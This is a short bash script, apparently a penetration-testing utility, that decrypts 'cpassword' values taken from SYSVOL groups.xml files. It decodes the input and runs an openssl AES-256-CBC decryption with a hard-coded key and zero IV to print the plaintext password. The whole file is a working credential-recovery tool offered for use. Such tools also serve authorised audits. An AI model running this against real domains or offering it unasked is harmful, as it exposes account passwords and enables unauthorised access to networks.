#!/bin/bash
# Decrypt cpassword found in SYSVOL (groups.xml)

if [ -z "${1}" ]; then
    echo "Usage: ${0} <crypto>"
    exit
fi

echo -n ${1} | base64 -d 2>/dev/null | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 2>/dev/null
